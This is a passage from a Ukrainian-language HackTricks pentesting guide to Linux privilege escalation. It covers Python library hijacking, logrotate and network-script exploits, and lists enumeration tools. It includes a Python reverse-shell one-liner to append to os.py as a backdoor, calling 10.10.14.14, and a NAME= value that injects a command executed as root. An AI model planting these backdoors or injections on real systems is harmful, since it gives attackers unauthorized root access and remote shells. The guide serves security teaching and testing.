Ви також повинні перевірити файли, що містять слово "**password**" у своєму **імені** або всередині **вмісту**, а також перевірити IP-адреси та електронні адреси всередині журналів або хешів regexps.\
Я не буду перераховувати тут, як робити все це, але якщо вас це цікавить, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Записувані файли

### Підміна бібліотек Python

Якщо ви знаєте **звідки** буде виконуватися сценарій Python і ви **можете писати всередині** цієї теки або ви можете **змінювати бібліотеки Python**, ви можете змінити бібліотеку ОС і встановити в неї задній прохід (якщо ви можете писати там, де буде виконуватися сценарій Python, скопіюйте та вставте бібліотеку os.py).

Для **встановлення заднього проходу в бібліотеку** просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація Logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** на файл журналу або його батьківські каталоги потенційно отримати підвищені привілеї. Це тому, що `logrotate`, який часто працює в якості **root**, може бути зманіпульований для виконання довільних файлів, особливо в каталогах, таких як _**/etc/bash\_completion.d/**_. Важливо перевіряти дозволи не лише в _/var/log_, але й в будь-якому каталозі, де застосовується обертання журналу.

{% hint style="info" %}
Ця уразливість впливає на версію `logrotate` `3.18.0` та старіші
{% endhint %}

Докладнішу інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому кожного разу, коли ви виявляєте, що ви можете змінювати журнали, перевірте, хто керує цими журналами, і перевірте, чи можете ви підвищити привілеї, замінюючи журнали символічними посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на уразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо, з якої завгодно причини, користувач може **записувати** сценарій `ifcf-<що-небудь>` до _/etc/sysconfig/network-scripts_ **або** може **налаштувати** існуючий, то ваша **система взламана**.

Мережеві сценарії, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно так само, як файли .INI. Однак вони \~підключаються\~ на Linux за допомогою Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` в цих мережевих сценаріях не обробляється правильно. Якщо у вас є **білий/порожній пробіл у назві, система намагається виконати частину після білого/порожнього пробілу**. Це означає, що **все після першого порожнього пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd та rc.d**

Директорія `/etc/init.d` є домашньою для **скриптів** для System V init (SysVinit), **класичної системи управління службами Linux**. Вона містить скрипти для `start`, `stop`, `restart` та іноді `reload` служб. Їх можна виконати безпосередньо або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat - `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язана з **Upstart**, новішою **системою управління службами**, яку ввів Ubuntu, використовуючи файли конфігурації для завдань управління службами. Незважаючи на перехід до Upstart, скрипти SysVinit все ще використовуються поряд з конфігураціями Upstart через шар сумісності в Upstart.

**systemd** виходить як сучасний ініціалізатор та менеджер служб, який пропонує розширені функції, такі як запуск демонів за вимогою, управління автомонтуванням та знімками стану системи. Він організовує файли в `/usr/lib/systemd/` для пакунків розподілу та `/etc/systemd/system/` для модифікацій адміністратора, спрощуючи процес адміністрування системи.

## Інші трюки

### Підвищення привілеїв NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Вибірка з обмежених оболонок

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Захист ядра

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Статичні бінарні файли Impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Інструменти підвищення привілеїв Linux/Unix

### **Кращий інструмент для пошуку векторів підвищення привілеїв на локальному рівні Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелічення уразливостей ядра в Linux та MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (фізичний доступ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Компіляція додаткових скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
